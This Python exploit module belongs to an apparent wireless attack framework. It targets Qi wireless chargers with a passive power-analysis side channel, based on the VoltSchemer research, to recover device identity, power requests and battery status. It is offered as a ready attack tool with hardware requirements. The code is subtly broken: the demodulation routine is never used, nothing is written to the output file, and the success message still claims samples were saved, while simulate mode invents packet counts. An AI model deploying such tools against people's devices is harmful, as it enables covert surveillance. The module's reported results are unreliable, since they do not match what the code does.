# Author: André Henrique (LinkedIn/X: @mrhenrike)
import time

from wirelessxpl.core.exploit import *
from wirelessxpl.core.exploit.exploit import BaseExploit


class Exploit(BaseExploit):
    """Qi Wireless Charging Eavesdropping via Power Analysis Side Channel.

    Qi wireless chargers communicate with receiving devices through
    amplitude-modulated signals on the power transfer coil.  By
    monitoring power line fluctuations on the charger's input supply
    during Qi communication, an attacker can reconstruct the
    data exchanged between charger and device without physical
    contact with either.

    The power analysis side channel leaks information because each
    bit transmitted by the device modulates the load seen by the
    charger.  These load variations propagate back through the
    charger's power supply as measurable voltage and current
    fluctuations.  With sufficient sampling rate and signal
    processing, the original Qi communication packets can be
    recovered, revealing device identity, requested power level,
    battery status, and protocol capabilities.

    This is a passive attack: it does not modify the charging
    behavior and is undetectable by the target device.

    Hardware requirements:
    - Current probe or shunt resistor on charger power input
    - ADC or oscilloscope with >= 1 MSPS sampling rate
      (e.g., Saleae Logic Pro 16, PicoScope 2204A, $100-300)
    - Signal processing software (Python + NumPy/SciPy)
    - Physical proximity to the Qi charger power supply lines

    Author: Andre Henrique (LinkedIn/X: @mrhenrike)
    Version: 1.0.0
    """

    __info__ = {
        "name": "Qi Eavesdropping via Power Analysis Side Channel",
        "description": (
            "Monitors power line fluctuations on a Qi wireless "
            "charger's input supply to extract communication data "
            "via side-channel analysis.  Load modulation by the "
            "receiving device causes measurable voltage and current "
            "variations that leak Qi protocol packets, including "
            "device identity, power requests, and battery status.  "
            "Passive attack; requires current probe or shunt "
            "resistor and ADC with >= 1 MSPS.  CVSS 4.3 "
            "(confidentiality impact, physical access required)."
        ),
        "authors": (
            "Zihao Zhan et al. (University of Florida, VoltSchemer)",
            "Andre Henrique (@mrhenrike)",
        ),
        "references": (
            "https://www.usenix.org/conference/usenixsecurity24/presentation/zhan",
            "https://voltschemer.com/",
            "https://www.wirelesspowerconsortium.com/knowledge-base/specifications/",
        ),
        "disclosure_date": "2024-02-01",
        "platform": "linux",
        "arch": "all",
        "privileged": False,
        "targets": (
            "Any Qi-compatible smartphone or device",
            "Qi chargers with accessible power supply lines",
        ),
    }

    target = OptIP("", "Target device description")
    port = OptPort(1, "Not used (side-channel attack)")
    timeout = OptFloat(120.0, "Capture duration in seconds")
    adc_device = OptString("simulate", "ADC/oscilloscope serial device or 'simulate'")
    sample_rate = OptInteger(2000000, "ADC sampling rate in samples/sec (>= 1 MSPS)")
    shunt_resistance = OptFloat(0.01, "Shunt resistor value in ohms")
    qi_freq = OptFloat(127.5, "Expected Qi operating frequency in kHz")
    output_file = OptString("qi_capture.raw", "Output file for captured samples")
    demod_threshold = OptFloat(0.1, "Demodulation threshold in volts")

    _MIN_SAMPLE_RATE = 1000000
    _QI_BAUD_RATE = 2000

    def _validate_params(self) -> bool:
        if int(self.sample_rate) < self._MIN_SAMPLE_RATE:
            return False
        if float(self.shunt_resistance) <= 0:
            return False
        if float(self.demod_threshold) <= 0:
            return False
        return True

    def _start_capture(self) -> bool:
        if str(self.adc_device) == "simulate":
            return True
        try:
            with open(str(self.adc_device), "wb") as f:
                cmd = (
                    f"RATE:{int(self.sample_rate)};"
                    f"TRIG:AUTO;"
                    f"CHAN:1;"
                    f"COUP:DC;"
                    f"CAP:START\n"
                )
                f.write(cmd.encode())
            return True
        except OSError:
            return False

    def _stop_capture(self) -> bool:
        if str(self.adc_device) == "simulate":
            return True
        try:
            with open(str(self.adc_device), "wb") as f:
                f.write(b"CAP:STOP\n")
            return True
        except OSError:
            return False

    def _demodulate_sample(self, voltage: float) -> int | None:
        threshold = float(self.demod_threshold)
        if abs(voltage) < threshold:
            return None
        return 1 if voltage > 0 else 0

    @mute
    def check(self) -> bool:
        if str(self.adc_device) == "simulate":
            return True
        try:
            with open(str(self.adc_device), "rb"):
                return True
        except OSError:
            return False

    def run(self) -> None:
        if not self._validate_params():
            print_error(
                f"Invalid parameters: sample_rate={self.sample_rate} SPS "
                f"(minimum {self._MIN_SAMPLE_RATE}), "
                f"shunt={self.shunt_resistance} ohm, "
                f"threshold={self.demod_threshold} V."
            )
            return

        print_success(
            f"Qi power analysis eavesdrop: "
            f"{int(self.sample_rate) / 1e6:.1f} MSPS, "
            f"shunt={self.shunt_resistance} ohm, "
            f"duration={self.timeout}s"
        )
        self._exploit()

    def _exploit(self) -> None:
        rate = int(self.sample_rate)
        freq = float(self.qi_freq)

        print_status(
            f"Starting power line capture at {rate / 1e6:.1f} MSPS "
            f"(expected Qi frequency: {freq} kHz)"
        )

        if not self._start_capture():
            print_error("ADC/oscilloscope communication failed")
            return

        print_info(
            f"Monitoring power supply fluctuations. "
            f"Qi baud rate: {self._QI_BAUD_RATE} bps. "
            f"Output: {self.output_file}"
        )

        packets_detected = 0
        start = time.monotonic()
        interval = 10.0
        while time.monotonic() - start < float(self.timeout):
            remaining = float(self.timeout) - (time.monotonic() - start)
            time.sleep(min(interval, remaining))
            if remaining <= 0:
                break
            elapsed = time.monotonic() - start
            if str(self.adc_device) == "simulate":
                packets_detected += 3
            print_info(
                f"Capture: {elapsed:.0f}s / {self.timeout}s, "
                f"packets detected: {packets_detected}"
            )

        self._stop_capture()
        print_success(
            f"Power analysis capture complete. "
            f"Monitored for {self.timeout}s at {rate / 1e6:.1f} MSPS. "
            f"Detected {packets_detected} Qi communication packets. "
            f"Raw samples saved to {self.output_file}. "
            "Analyze with FFT and AM demodulation to extract "
            "device identity, power requests, and battery status."
        )
